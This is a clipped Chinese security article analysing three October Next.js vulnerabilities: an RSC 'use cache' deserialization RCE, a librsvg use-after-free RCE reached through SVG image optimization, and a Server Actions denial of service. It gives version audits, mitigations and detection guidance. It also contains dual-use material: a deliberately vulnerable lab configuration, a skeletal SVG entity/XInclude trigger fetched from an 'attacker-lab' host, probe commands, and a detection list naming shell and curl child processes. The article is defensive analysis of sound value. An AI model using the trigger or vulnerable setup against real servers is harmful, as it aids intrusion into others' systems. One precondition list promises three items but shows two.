---
title: 【微信】10月Next.js未授权远程代码执行漏洞链分析
source: https://mp.weixin.qq.com/s/dvMj_VJ8zeaCmCWtjJqJPw
source_host: mp.weixin.qq.com
clip_date: 2026-10-16T20:59:55+08:00
trace_id: 9fc605dd-dbbf-4eb3-9717-5789e07da50b
content_hash: 05a1dca4c1afb03ca59afe932fd16aacda9b267901140f38e6a0d9f9c62ac4c8
status: synced
tags:
  - 微信
  - 漏洞分析
  - 开发工具
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Next.js 16.4.1/15.5.28 修复三枚未认证可达漏洞：两枚 Critical 级 RCE 与一枚 Server Actions DoS，修复落点在依赖层而非应用代码。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 3fb75244-d011-81b2-bf05-dc0270a19bb0
ioc:
  cves:
    - CVE-2025-55182
    - CVE-2025-66478
    - CVE-2026-75604
    - CVE-2026-94545
    - CVE-2026-96889
  cwes:
    - CWE-116
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Next.js 16.4.1/15.5.28 修复三枚未认证可达漏洞：两枚 Critical 级 RCE 与一枚 Server Actions DoS，修复落点在依赖层而非应用代码。
> 
> - **漏洞一（16.x 专属）：** `use cache` 函数返回多个 typed array 时，RSC 反序列化可致未授权 RCE，无 CVE、无 workaround，官方要求即使无同类函数也升级至 16.4.1。
> - **漏洞二（CVE-2026-96889 / VectorFreed）：** SVG 经 sharp→libvips→librsvg 触发同名实体导致的 UAF，glibc Linux 上可稳定化为 RCE，影响 10.0.0–16.4.0，须核验 `@img/sharp-libvips-*` 且 sharp≥0.35.5。
> - **漏洞三：** App Router 只需存在任一 Server Action，未认证请求即可打满 CPU 阻塞同进程；Pages Router 不受影响。
> - **扫描盲区：** 两枚公告无 CVE，未进入 OSV/npm advisory，`npm audit` 与多数 SCA 结构性漏报；WAF 无法可靠拦截结构合法的 RSC 载荷。
> - **15.x 特别提示：** 15.5.28 仍接受 sharp 0.34.x，覆盖安装后需强制提升并复验，否则 SVG RCE 实际未修复。

**星宇Sec** *2026年10月16日 20:36*

* * *

## 摘要

2026-10-14，Vercel以带外方式发布Next.js 16.4.1（Active LTS）与15.5.28（Maintenance LTS），修复三枚上游依赖引发的漏洞：两枚Critical级可致未授权远程代码执行（RCE），一枚High级为Server Actions拒绝服务\[1\]。

本次更新的三个特殊之处：两枚修复原定9月发布，因上游依赖交付延迟而推迟\[1\]；三枚公告中有两枚 **没有CVE编号**，且截至本文撰写时尚未进入OSV/npm advisory数据源，主流依赖扫描器存在结构性漏报\[2\]\[4\]；两枚RCE的根因分别落在React Server Components序列化通道（ `react-server-dom-*` ）与原生SVG渲染栈（librsvg/libxml2经sharp引入）两个完全不同的层次，却共用同一App Router攻击面。

**关键词**：Next.js；React Server Components； `use cache` ；Cache Components；Image Optimization；librsvg；use-after-free；sharp；未授权RCE；供应链安全

![Next.js未认证请求的四条入口与缺陷落点](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d193ec8a7a3d16f8.svg)

Next.js未认证请求的四条入口与缺陷落点

**图1** 未认证请求的四条入口、缺陷落点与后果分级。虚线框表示9月已修复的Satori注入原语，它与10月的原生内存缺陷位于同一图像渲染链上。

* * *

## 1 漏洞概述

### 1.1 披露时间线

![2026年8—10月Next.js漏洞披露时间线](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/837dffc993ae6a63.svg)

2026年8—10月Next.js漏洞披露时间线

**图2** 8—10月披露节奏。红色节点为Critical级RCE修复，橙色弧线表示两项修复因上游依赖延迟从9月例行发布推至10-14的带外发布\[1\]\[6\]。

| 日期  | 事件  |
| --- | --- |
| 2026-07-13 | Next.js确立月度安全发布流程 |
| 2026-08-25 | 提前一天发布16.3.3 / 15.5.24：修复Windows路径穿越RCE（CVE-2026-75604）与AVIF优化RCE（GHSA-2xp9-vwfh-vxw4）\[6\] |
| 2026-09-22 | 带外发布16.3.6 / 15.5.26：修复 `next/og` `ImageResponse` RCE（CVE-2026-94545，上游Satori转义缺陷）\[6\] |
| 2026-09-23 | librsvg use-after-free（CVE-2026-96889）细节公开，代号 **VectorFreed** \[7\] |
| 2026-09-27 | sharp发布修复版本，捆绑的librsvg完成升级\[7\] |
| 2026-09-30 | 9月例行发布16.3.7 / 15.5.27（9项漏洞），其中两项因上游未就绪被推迟 |
| 2026-10-08 | 官方预告带外更新：处理"两枚Critical + 一枚High"\[1\] |
| 2026-10-14 | 发布16.4.1 / 15.5.28，同时公开三枚Next.js公告与两枚React上游公告\[1\]\[2\]\[3\]\[4\]\[5\] |

### 1.2 评分与影响面

| #   | 编号  | 位置  | Severity | CVSS 4.0 | 受影响版本 | 修复版本 |
| --- | --- | --- | --- | --- | --- | --- |
| 1   | GHSA-673q-mjm6-r5xr  <br>上游GHSA-xqc2-xf4c-x3h3 | `use cache`<br><br>函数返回多个typed array | Critical | 9.5  <br>AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:N | 16.0.0–16.4.0 | **16.4.1**  <br><br>react-server-dom-\*需19.0.9/19.1.10/19.2.9/19.3.1 |
| 2   | CVE-2026-96889  <br>GHSA-2464-fhr4-w9xw | Image Optimization处理SVG | Critical | 9.5  <br>AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H | 10.0.0–15.5.27；16.0.0–16.4.0 | **15.5.28 / 16.4.1**  <br><br>缓解：sharp≥0.35.5 |
| 3   | GHSA-p3m5-59mp-jv5r  <br>上游GHSA-h3gv-c5rc-p453 | Server Actions拒绝服务 | High | 8.2  <br>AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N | 13.0.0–15.5.27；16.0.0–16.4.0 | **15.5.28 / 16.4.1** |

两点需在工程上强调：

-   **漏洞一仅影响16.x。** Cache Components是16.x特性，15.5分支不在区间内， `v15.5.28` 的release notes也只列后两项\[1\]。但官方原话是" **即使你的应用没有类似函数也应当立即升级** "\[2\]，不能据此跳过。
    
-   **CVSS分歧反映的是攻击面差异。** 同一枚CVE-2026-96889，Red Hat给CVSS v3 7.8（ `AV:L` +需用户交互，上游修复版记为2.63.1），Vercel在Next.js语境下给CVSS 4.0 9.5（ `AV:N` +无需交互）\[3\]\[8\]。差异来自"由谁触发解析"：桌面场景需用户打开恶意图片，而Next.js只需一个未认证的 `GET /_next/image?url=...`。定级应以自身业务是否允许未认证请求直达图像处理组件为准。
    

* * *

## 2 漏洞详情

### 2.1 漏洞一：use cache返回多个typed array的未授权RCE

官方表述（逐字）\[2\]：

> "A vulnerability in applications using App router with Cache Component can lead to remote code execution. The application needs to have a `use cache` function that returns multiple typed arrays."
> 
> "There is no known workaround for affected applications with such `use cache` functions. You should upgrade immediately even if your application does not have similar functions."

根因在React而非Next.js。上游公告限定条件为："Crafted payloads targeting frameworks supporting React Server Components can lead to remote code execution. This only affects extremely rare cases where responses transport multiple typed arrays and an attacker-controlled value."\[5\]受影响的是三个RSC序列化绑定包 `react-server-dom-webpack` / `-parcel` / `-turbopack` ，区间19.0.0–19.0.8、19.1.0–19.1.9、19.2.0–19.2.8、19.3.0。

攻击链三个必要前提，缺一即不成立：

1.  使用 **App Router** 并启用 **Cache Components**；
    
2.  存在返回 **多个** typed array（ `Uint8Array` / `ArrayBuffer` 等）的 `use cache` 函数，典型如返回字节与签名二元组、protobuf/msgpack序列化载荷；
    

满足前提时，恶意输入进入RSC（"Flight"）协议的反序列化流程。typed array在Flight载荷中以分块引用表达， **多个** typed array的偏移与引用解析存在缺陷路径，可被引导至异常对象并影响后续调用目标绑定，最终在服务端进程上下文执行代码。需明确： **Vercel与React均未公布该缺陷的调用链级细节**，本文不对未公开的gadget链作臆测。

历史坐标：这与2025-12的React2Shell（CVE-2025-55182 / CVE-2025-66478，RSC Flight协议原型链污染，CVSS 10.0）落在同一组 `react-server-dom-*` 包上，但本次范围窄得多——React自己用"extremely rare cases"作了限定\[5\]。此外Vercel在2026-05的变更日志中已承认，RSC类攻击载荷"表现为正常的HTTP请求结构，WAF层无法可靠拦截"，该结论对本次同样适用。

### 2.2 漏洞二：Image Optimization处理SVG的未授权RCE（CVE-2026-96889 / VectorFreed）

官方表述（逐字）\[3\]：

> "A memory-related vulnerability has been discovered in an upstream library used for Image Optimization can lead to possible remote code execution (RCE) when Next.js runs on glibc-based Linux."
> 
> "Ensure the version of `sharp` used by Next.js is greater than or equal to `0.35.5`."

这不是Next.js的代码缺陷，而是原生栈内存破坏的穿透——公告给出的缓解与修复动作都落在sharp版本上，而非Next.js自身的优化器代码。数据路径：

```
攻击者 → GET /_next/image?url=<attacker-hosted>&w=...&q=...
      → Next.js Image Optimization
      → sharp → libvips (VipsForeignLoadSvg) → librsvg + libxml2   ← CVE-2026-96889
      → 原生进程内存破坏 → glibc Linux上可稳定化为代码执行
```

发现者@rafabd1（Rafael B. Dias）将该链命名为VectorFreed，机制如下\[7\]：SVG可通过 `xi:include` 引入另一个SVG文档；脆弱路径中， **libxml2在外层文档展开实体时，librsvg已开始解析被包含文档**；若被包含SVG声明 **同名实体**，librsvg会替换并 **释放** 第一个实体对象，而libxml2仍持有其指针；被包含文档解析结束后，libxml2继续用这一 **悬垂指针** 写入，此时该内存可能已归属其他对象。结果是崩溃，而" **in other cases this also led to command execution** "。这是两个解析器对同一文档树并发持有可变状态导致的生命周期不一致（owner-confusion UAF），不是简单越界写。

关键约束：

| 条件  | 说明  |
| --- | --- |
| 平台  | 公告仅指 **glibc-based Linux**；musl/Alpine与macOS不在官方风险描述内，能否稳定利用还取决于Node.js构建是否加固（PIE/RELRO）\[3\] |
| 运行时 | Node.js运行时。Edge运行时用沙箱化 `resvg-wasm` ，不进入该路径 |
| SVG入口A | `images.dangerouslyAllowSVG: true`<br><br>+攻击者可控 `url` 。 **默认关闭**，官方文档的理由正是"SVG具备与HTML/CSS同类特性，缺乏CSP时会导致漏洞"\[9\] |
| SVG入口B | `next/og`<br><br>的 `ImageResponse` 在Node运行时下使用 **同一套** 渲染栈，与CVE-2026-94545共享底层缺陷面\[1\]\[6\] |
| 依赖形态 | 使用sharp预构建二进制时，真正的librsvg藏在\*\* `@img/sharp-libvips-*` **包内，** 只升级系统librsvg无效\*\*\[7\] |

**修复实质**：该条公告的缓解与修复都表现为"把sharp提升到0.35.5"，其内含修复后的librsvg\[3\]\[7\]。这解释了该条公告为何横跨Next.js 10.0.0至16.4.0——漏洞一直存在于依赖树中。上游librsvg修复版被记为2.63.1（Red Hat）/2.63.2（VectorFreed与sharp捆绑）\[7\]\[8\]。

![sharp与librsvg的版本传导链](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7b97006210445230.svg)

sharp与librsvg的版本传导链

**图3** 修复的版本传导链与两个最常见的处置失效点。缺陷实际落点在librsvg，而它由sharp的预构建捆绑包带入应用，因此"升级了next"与"库已修复"之间还差一次依赖树核验。

### 2.3 漏洞三：App Router Server Actions拒绝服务

官方表述（逐字）\[4\]：

> "Crafted requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive CPU usage blocking processing of further requests in the same process."
> 
> "Applications using Pages Router or not using Server Actions are not vulnerable."

上游React公告表述更宽："...this could lead to out-of-memory exceptions or excessive CPU usage."\[5\]两点不一致：React侧同时提到 **OOM与CPU耗尽**，Next.js侧只强调CPU；且React公告正文段落把受影响版本写作19.0.0–19.0.7/19.1.0–19.1.8/19.2.0–19.2.7，而页面表格列出19.0.0–19.0.8/19.1.0–19.1.9/19.2.0–19.2.8/19.3.0， **同一公告内部自相矛盾**——做资产判断时按更宽的表格取保守值\[5\]。

利用门槛极低：只需应用中存在至少一个Server Action，无需其被业务调用、无需认证。Next.js默认以有限进程数处理请求，CPU打满后同进程全部请求排队，等效全站不可用。除升级外无workaround。

### 2.4 同系列前奏

单独讨论10-14的三枚会低估风险，它们与8—9月三枚属于同一攻击面的连续发现：

-   **CVE-2026-94545** （9-22修复于16.3.6 / Satori 0.33.5）：根因是Satori把攻击者可控值写入SVG元素、XML名称与内部style字段时 **转义不足**，使其被当作SVG标记解释\[6\]。即\*\*Satori的CWE-116编码缺陷负责"把文本变成SVG标记"，VectorFreed一类内存缺陷负责"把标记变成代码执行"\*\*——注入原语与内存破坏原语的组合才是本轮图像类RCE的完整形状。
    
-   **GHSA-2xp9-vwfh-vxw4** （AVIF，CVSS 4.0 9.5）：根因在sharp依赖的 **libheif** 堆溢出；官方缓解是"在完成上游修复传导之前 **直接禁用AVIF优化** "\[6\]。这是Next.js首次以"关掉功能"而非"等补丁"应对原生栈RCE。
    
-   **CVE-2026-75604** （Windows路径穿越，CVSS 9.0）：ISR/增量缓存键的转义正则只覆盖 `/` 、 `#` 、`?`， **漏掉反斜杠**，Windows上`..%5C` 可越出缓存目录\[6\]。第三方分析认为后续可读取 `server-reference-manifest.json` 中的Server Action `encryptionKey` 进而伪造 `Next-Action` 绑定参数， **该升级路径官方公告文本未记载，应作假设而非结论**。
    

* * *

## 3 复现与验证

> 步骤3.2的资产自查为只读操作，可用于生产环境；3.3–3.5的触发类验证仅限自有靶标。

### 3.1 实验环境

复现图像类RCE的关键是精确复刻依赖栈：Next.js版本、Node二进制加固状态、sharp版本、捆绑的libvips/librsvg版本必须同时对齐，否则观察到的只是崩溃。

```bash
npm init -y
npm install next@16.4.0 react@19.2.8 react-dom@19.2.8
npm install sharp@0.35.4          # 捆绑旧 librsvg，落在缺陷区间
npx next build && npx next start -p 3000
```

```dockerfile
FROM node:24-bookworm              # glibc 基础镜像，符合公告条件
WORKDIR /app
COPY . .
RUN npm ci && npx next build
EXPOSE 3000
CMD ["npx","next","start","-p","3000"]
```

```bash
docker build -t nextjs-rce-lab .
docker run -d --name lab --network none -p 3000:3000 nextjs-rce-lab
```

开启两条SVG入口：

```java
// next.config.js
module.exports = {
  experimental: { cacheComponents: true },   // 漏洞一前提
  images: {
    dangerouslyAllowSVG: true,               // 使 SVG 进入 sharp 解析路径
    remotePatterns: [{ protocol: 'https', hostname: '**' }],
  },
}
```

```javascript
// app/api/og/route.js —— Node 运行时 + sharp
import { ImageResponse } from 'next/og'

export function GET(request) {
  const value = new URL(request.url).searchParams.get('value') ?? 'hello'
  return new ImageResponse(
    (
      <div style={{ display: 'flex', fontSize: 40, padding: 40 }}>
        <text>{value}</text>          {/* 攻击者可控值抵达 SVG 文本节点 */}
      </div>
    ),
    { width: 1200, height: 630 },
  )
}
```

### 3.2 生产可用的资产自查（只读）

**版本与依赖审计。** 不要只看 `next` 版本，必须查出sharp的实际解析结果——这是最容易漏掉的一环。

```bash
npm ls next                                  # 期望 >=16.4.1 或 >=15.5.28
npm ls sharp                                 # 期望 >=0.35.5，注意是否存在多份副本
npm ls react-server-dom-webpack \
       react-server-dom-parcel \
       react-server-dom-turbopack            # 期望 >=19.0.9 / 19.1.10 / 19.2.9 / 19.3.1

# 真正决定 librsvg 版本的是捆绑包，不是系统库
npm ls @img/sharp-libvips-linux-x64 @img/sharp-libvips-linux-arm64 2>/dev/null

# 运行时确认，比 lockfile 更可信
node -e "console.log(require('sharp').versions())"
```

> **15.x用户特别警告：** 15.5.28的依赖声明 **仍接受受影响的sharp 0.34.x**，覆盖安装后包管理器很可能保留lockfile中的旧sharp，导致SVG RCE实际未被修复。必须核验 **全部路径** ≥0.35.5，不达标时 `npm install sharp@^0.35.5` 强制提升后 **复验**，并确认CI构建不会回退\[1\]\[3\]。

**暴露面测绘。**

```swift
curl -s -o /dev/null -w "image:%{http_code}\n" \
  "http://TARGET/_next/image?url=%2Flogo.png&w=640&q=75"

# 返回 500/400 说明 SVG 未进入优化路径
curl -s -o /dev/null -w "svg:%{http_code}\n" \
  "http://TARGET/_next/image?url=https%3A%2F%2F<自有可控域名>%2Fx.svg&w=64&q=75"

curl -s -o /dev/null -w "og:%{http_code}\n" "http://TARGET/api/og?value=probe"
```

**静态审计定位 `use cache` 前提。**

```python
rg -n --glob '!node_modules' "'use cache'" app/ src/ components/

# 是否返回二进制视图（粗筛，需人工复核）
rg -n -U --multiline-dotall --glob '!node_modules' \
  "['\"]use cache['\"][\s\S]{0,400}?(Uint8Array|ArrayBuffer|Buffer|Int8Array|Float32Array)" app/ src/

rg -n "cacheComponents" next.config.*
```

判定规则：命中项中若返回值存在 **两个以上** typed array字段，且任一字段字节可追溯到 `request` / `cookies()` / `headers()` / `searchParams` /上传流/外部API响应，按Critical处理。

### 3.3 漏洞二复现要点

VectorFreed仓库提供的是面向多条输入路径的 **SVG生成器**，定位是"验证use-after-free"，而非通用RCE武器\[7\]。本文只描述形态。

```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude" width="64" height="64">
  <!DOCTYPE svg [ <!ENTITY shared "..."> ]>   <!-- 外层：libxml2 在此展开实体 -->
  <rect width="64" height="64"/>
  <xi:include href="inner.svg" parse="xml"/>  <!-- 内层：声明同名实体，触发 UAF -->
</svg>
```

```bash
curl -sS -o /dev/null -w "%{http_code} %{size_download}\n" \
  "http://127.0.0.1:3000/_next/image?url=http%3A%2F%2Fattacker-lab%2Fouter.svg&w=64&q=75"

docker logs lab --tail 50 | grep -Ei 'segmentation|SIGSEGV|abort|out of memory'
docker inspect -f '{{.State.ExitCode}} {{.State.OOMKilled}}' lab
```

**四条必须知道的验证边界：**

-   rafabd1明确声明：\*\*"这个链没有通用RCE PoC，载荷需按目标逐一定制" **，且** "目前公开的大部分所谓PoC并未复现真实RCE链"\*\*，其中一些靠SVG的 `<foreignObject>` 制造"执行"效果——那不是本漏洞的利用路径\[7\]。看到这类PoC跑出效果应判断为误报。
    
-   该README早期版本称尚无完整SVG→命令执行的公开利用，更新版则提到完整可用利用已公开，同时提醒"以当前工具从已公开的bug与patch反推完整链是可行的"\[7\]。\*\*"尚无在野武器化"不构成拖延修复的理由。\*\*
    
-   加固良好的Node官方构建（PIE+RELRO）上多数只观察到崩溃；非PIE构建上ROP链稳定性显著提高。\*\*"我们容器里只是500报错"不代表不可利用\*\*，只代表当前构建形态下未稳定化。
    
-   只升级系统librsvg无效：sharp预构建走 `@img/sharp-libvips-*` 捆绑副本\[7\]。
    

### 3.4 漏洞一与漏洞三的验证要点

漏洞一因官方未公开细节且无公开PoC， **目前没有可靠的远程判定手段**，可执行验证限于：版本面（16.0.0≤next≤16.4.0且 `react-server-dom-*` 在受影响区间）、能力面（Cache Components已启用）、构造面（3.2静态审计命中并人工确认可控值进入缓存返回值）。若前两者成立，即使构造面无命中仍应升级——官方"即使没有类似函数也立即升级"的措辞本身说明作者无法穷举触发形态\[2\]。

漏洞三的验证限于行为面：确认应用存在 `'use server'` 指令，然后在靶标内观察单进程CPU能否被拉满并阻塞后续请求。载荷形态是RSC action请求体（ `Next-Action` header+ `multipart/form-data` ）， **在网络侧与正常请求无异**，无法靠"请求是否畸形"拦截\[4\]\[5\]；可检测的是同一来源短时间高频命中action端点+单进程CPU阶梯式上升。

### 3.5 修复验证（闭环）

```bash
npm install next@16.4.1 sharp@^0.35.5     # v16 线；15.x 线改用 next@15.5.28
npx next build && npx next start
npm ls next sharp @img/sharp-libvips-linux-x64
node -e "console.log(require('sharp').versions())"

# 若曾使用下述临时缓解，正式升级后必须移除以恢复 SVG 处理
# sharp.block({ operation: ['VipsForeignLoadSvg'] })
```

验收四项：①重启/滚动更新后进程实际加载版本；②lockfile已提交、CI不回退；③三条入口逐一重放，不再出现崩溃/5xx/CPU异常；④ **升级不能清除已植入的后门**——若补丁窗口期内存在被利用可能，须按"已失陷"处置：轮换应用层密钥（含Server Action `encryptionKey` 与全部环境变量凭据）、排查持久化与异常外联、吊销活跃会话。

* * *

## 4 缓解、检测与响应

### 4.1 处置流程

![按版本线与暴露面的处置流程](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/06d61279269e2f36.svg)

按版本线与暴露面的处置流程

**图4** 处置流程。上半区按版本线给出升级目标，中部按暴露面判定临时措施是否可用，右侧为闭环验收清单。

### 4.2 升级矩阵（唯一可靠手段）

| 版本线 | 目标版本 | 同时必须满足 |
| --- | --- | --- |
| 16.x（Active LTS） | **≥16.4.1** | sharp≥0.35.5；react-server-dom-\*≥19.2.9/19.3.1 |
| 15.5.x（Maintenance LTS） | **≥15.5.28** | **手动强制**<br><br>sharp≥0.35.5（15.5.28仍接受0.34.x） |
| 13.x / 14.x | 迁移至15.5.28或16.4.1 | DoS区间自13.0.0起；13.4起还涉及CVE-2026-75604 |
| 10.x–12.x | 至少确保sharp≥0.35.5或禁用SVG优化 | 该区间仅受SVG RCE影响 |

### 4.3 无法立即升级时的临时措施

| 措施  | 覆盖  | 不覆盖 |
| --- | --- | --- |
| `sharp.block({ operation: ['VipsForeignLoadSvg'] })`<br><br>在libvips层拒绝SVG加载 | 漏洞二 | 漏洞一、三，及AVIF路径 |
| 关闭 `images.dangerouslyAllowSVG` （保持默认 `false` ） | 漏洞二经Image Optimization的入口 | 经 `next/og` 的入口 |
| `npm uninstall sharp`<br><br>，不再使用原生光栅化 | 漏洞二、CVE-2026-94545 | 漏洞一、三 |
| `contentDispositionType: 'attachment'`<br><br>\+ `contentSecurityPolicy: "default-src 'self'; script-src 'none'; sandbox;"` | 已泄露SVG的 **客户端** 脚本执行 | 服务端RCE |
| 迁移Edge运行时 | 图像类RCE（走 `resvg-wasm` ） | 漏洞一、三； **官方已将Edge实现标记为弃用，不宜作长期方案** |
| 改造返回多个typed array的 `use cache` 函数 | 漏洞一 | 成本高；官方判定"无已知workaround"\[2\] |

> **仅更新sharp只能修复图像处理漏洞，无法解决彼此独立的缓存函数RCE与Server Actions DoS。**

### 4.4 检测信号

-   **工具盲区（必须正视）**：漏洞一与漏洞三无CVE编号，三枚10-14公告截至检索时尚未进入OSV / GitHub Advisory全局库 / npm advisory feed， `npm audit` 与多数SCA会结构性漏报\[2\]\[4\]。 **处置依据应是lockfile版本比对+代码审计，而非SCA绿灯。**
    
-   **网络侧**：对 `/_next/image` 与图像/OG路由监控URL参数中的编码SVG特征（ `%3Csvg` 、 `<!DOCTYPE` 、 `ENTITY` 、 `xi:include` 、 `foreignObject` ）；对Server Action端点监控异常频率与请求体大小分布。 **不要指望WAF拦截RSC载荷**——其结构合法。
    
-   **主机/EDR侧**：Node.js进程派生shell或子进程（ `sh` / `bash` / `python` / `curl` ）、异常出站连接、`.next/` 之外落盘的可执行文件、worker异常退出与OOM、CPU/内存基线偏离、Image Optimization错误率突升。
    
-   **在野利用**：官方公告与主流厂商分析均未报告在野利用，截至检索时CISA KEV亦未收录这几枚Next.js CVE。但这与"补丁窗口期内的自动化探索"并不矛盾，公开利用代码的存在已把窗口期价值拉高。
    

### 4.5 关于Vercel托管

Vercel平台是否自动完成sharp与librsvg升级、本次三枚公告对托管应用的影响， **官方博客与安全公告均未明确说明**，本文不作推断。已明确的是：8月批次官方表示Vercel托管不受影响\[6\]。 **自托管（ECS/VPS/K8s/Docker/裸机）必须自行升级**，这也是本次公告的主要受众。

* * *

## 5 结论

Next.js 16.4.1 / 15.5.28处理的是三条彼此独立但攻击面重叠的缺陷： `use cache` 返回多个typed array触发的RSC反序列化RCE（16.x专属、无CVE、无workaround）、经sharp→libvips→librsvg的SVG use-after-free RCE（横跨10.0.0–16.4.0、glibc Linux、依赖版本核验是关键）、Server Actions CPU耗尽DoS。三者共同点是 **未认证可达**、 **WAF无法可靠拦截**、 **修复动作在依赖层而非应用代码层**。

这轮漏洞也暴露了两点结构性问题。其一，Next.js把librsvg、libxml2、libheif、libvips等内存不安全的C/C++代码放进了Web请求同步路径，并由未认证GET驱动——同一缺陷在桌面场景是CVSS 7.8的本地问题，在框架里就成了CVSS 9.5的网络问题\[3\]\[8\]；任何"图像优化"这类服务端能力都应按RCE组件做威胁建模。其二，框架方对上游CVE的处理方式是"版本bump+公告"，交付节奏受上游支配，"官方已修复"与实际依赖到位之间存在真实时滞，因此验收标准必须是依赖树实际解析结果而非"我们升到最新了"。

处置优先级：自托管且启用Cache Components的16.x应用、任何启用 `dangerouslyAllowSVG` 或使用Node运行时 `next/og` 的10.x–16.x应用按P0；其余13.x–16.x按P1（DoS面）；15.5.x用户升级后 **必须复验sharp版本**。所有在补丁窗口期内暴露的应用，应把密钥轮换与失陷排查纳入处置流程，而非止步于版本升级。

* * *

## 参考文献

\[1\] J. Story, K. Rahal, and S. Silbermann, "Next.js Security Update for Upstream Vulnerabilities," *Next.js Blog*, Vercel, Oct. 14, 2026. \[Online\]. Available: https://nextjs.org/blog/nextjs-security-update-october-14-2026

\[2\] Vercel, "Unauthenticated Remote Code Execution in `use cache` functions returning typed arrays," GitHub Security Advisory GHSA-673q-mjm6-r5xr, `vercel/next.js`, Oct. 14, 2026. \[Online\]. Available: https://github.com/vercel/next.js/security/advisories/GHSA-673q-mjm6-r5xr

\[3\] Vercel, "Unauthenticated Remote Code Execution in the Image Optimization API when using SVG (CVE-2026-96889)," GitHub Security Advisory GHSA-2464-fhr4-w9xw, `vercel/next.js`, Oct. 14, 2026. \[Online\]. Available: https://github.com/vercel/next.js/security/advisories/GHSA-2464-fhr4-w9xw

\[4\] Vercel, "Denial of Service in App Router using Server Actions," GitHub Security Advisory GHSA-p3m5-59mp-jv5r, `vercel/next.js`, Oct. 14, 2026. \[Online\]. Available: https://github.com/vercel/next.js/security/advisories/GHSA-p3m5-59mp-jv5r

\[5\] React Team, "Security advisories for React Server Components: unauthenticated remote code execution (GHSA-xqc2-xf4c-x3h3) and denial of service on server function endpoints (GHSA-h3gv-c5rc-p453)," `react/react`, Oct. 14, 2026. \[Online\]. Available: https://github.com/react/react/security/advisories/GHSA-xqc2-xf4c-x3h3 and https://github.com/react/react/security/advisories/GHSA-h3gv-c5rc-p453

\[6\] Vercel, "Next.js repository security advisories (GHSA-vcvr-r3jv-pc5j / CVE-2026-94545; GHSA-p293-qw3h-jr36 / CVE-2026-75604; GHSA-2xp9-vwfh-vxw4 / AVIF Image Optimization)," `vercel/next.js`, Aug.–Sept. 2026. \[Online\]. Available: https://github.com/vercel/next.js/security/advisories

\[7\] R. B. Dias (@rafabd1), "VectorFreed: a librsvg use-after-free (CVE-2026-96889) exploitation chain — mechanism, affected builds, and proof-of-concept," GitHub repository, Sept.–Oct. 2026. \[Online\]. Available: https://github.com/rafabd1/VectorFreed

\[8\] Red Hat, "CVE-2026-96889 — librsvg use-after-free," *Red Hat Customer Portal Security Data*, 2026. \[Online\]. Available: https://access.redhat.com/security/cve/CVE-2026-96889

\[9\] Vercel, "Image Component — `dangerouslyAllowSVG`, `contentDispositionType`, `contentSecurityPolicy`," *Next.js Documentation*, last updated Sept. 28, 2026. \[Online\]. Available: https://nextjs.org/docs/app/api-reference/components/image
